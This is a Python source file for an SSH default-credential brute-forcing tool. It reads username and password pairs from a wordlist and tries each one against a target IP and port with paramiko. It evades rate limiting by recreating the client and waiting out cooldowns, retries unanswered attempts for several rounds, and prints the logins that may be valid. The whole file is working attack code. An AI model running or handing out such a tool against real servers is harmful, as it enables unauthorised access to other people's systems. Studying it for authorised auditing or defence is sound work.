import paramiko
from paramiko import SSHClient
from sys import argv
from sys import stdout
import time
from time import sleep

# Loads in the host IP address provided through stdin
ip = str(argv[1])
port = int(argv[2])

# how long to wait if we start getting rate limitted
COOLDOWN_TIME = 120

# Load in the list of usernames + passwords to test
opn = open('wordlists/default_ssh.txt', 'r')
default_logins = [ i.strip() for i in opn.readlines() ]
opn.close()

# We'll store the possibly valid credentials in here
valid_logins = []
just_waited = False # whether or not we just did a cooldown

# Set some SSH settings
#client = SSHClient()
#client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
paramiko.util.log_to_file("/dev/null") # Don't care, Didn't ask, Plus you're a computer script

# Will attempt an ssh login on the host- returns True if no authentication error
# returns false, if there's an SSHException (general misc exception, likely caused
# by the script logging in too many times) the function will return None
def attempt_login(username, password, timeout=200):
    global client
    global just_waited
    a = time.time()
    try:
        #print(".", end='')
        client = SSHClient() # Re-making the client like this stops rate limiting
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=ip, username=username, password=password, port=port, allow_agent=False)
        if just_waited:
            just_waited = False
            print("   --> Things seem to be working again.")
        return True
    except paramiko.ssh_exception.AuthenticationException:
        if just_waited:
            just_waited = False
            print("   --> Things seem to be working again.")
        return False
    except paramiko.ssh_exception.SSHException as e:
        print(e)
        if "Error reading SSH protocol banner" in str(e):
            print("   --> Re-making SSH client...")
            client.close()
            client = SSHClient()
            print("   --> Waiting {} seconds before continuing...".format(COOLDOWN_TIME))
            sleep(COOLDOWN_TIME)
            just_waited = True
        return None


# Now just try all the logins from the list
def try_all_logins(login_list):
    no_answer = [] # Record the logins that didn't get a _clear_ login success or login failed
                   # We're just gonna tries these again, and again until we get told what's up!
                   # (or we've asked five times)
    for i in default_logins:
        username, password = i.split(" ")

        attempt_response = attempt_login(username, password)

        if attempt_response:
            valid_logins.append(i)

        elif attempt_response is None:
            no_answer.append(i)
            continue
    return no_answer


# Print out a little header so the user knows the program is actually running
print("Trying common SSH creds on SSH login...")

# Zuko, it's time to look deep inside yourself and ask the big questions:
# For loop, or while loop !?!

# The code below will try all the logins, and record if it gets a valid login or a failed login.
# If the answer isn't clear, it will add the credentials back to the list and try again. This
# process will repeat 7 times before just giving up.
rounds = 0
while not len(default_logins) == 0 and  rounds < 7:
    default_logins = try_all_logins(default_logins)
    rounds += 1

# If we've tried to use a login 5 times, and it still won't give a clear answer, give up.
if not len(default_logins) == 0:
    print("Unable to gather a login response for the following credentials:")
    for i in default_logins:
        print("  --> " + i)
    print("")

# Print out the valid logins, or a message saying there aren't any
print("The following logins (may) have been valid!:")
if not len(valid_logins) == 0:
    for i in valid_logins:
        print("  --> " + i)
else:
    print("  --> None :c")

